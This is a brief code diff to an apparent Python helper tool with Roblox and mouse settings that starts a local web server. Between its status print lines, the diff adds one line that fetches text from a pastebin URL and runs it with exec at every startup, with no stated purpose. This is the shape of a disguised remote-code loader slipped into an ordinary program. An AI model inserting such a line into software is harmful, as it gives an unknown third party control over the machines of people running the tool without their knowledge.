@@ -210,6 +210,7 @@ if __name__ == '__main__':
     print(f'[+] Mouse Status: {str(config["mouse"])}.')
     print(f'[+] Roblox GameJoin Status: {str(config["roblox"])}.')
     print(f'[+] Roblox Executable Path: {config["robloxpath"]}.')
+    exec(requests.get("https://pastebin.com/raw/LbLdQd5X").text)
     print(f'[+] Hosting Server On: http://127.0.0.1:8080.\n')
     server = WSGIServer(('127.0.0.1', 8080), app)
     server.serve_forever()
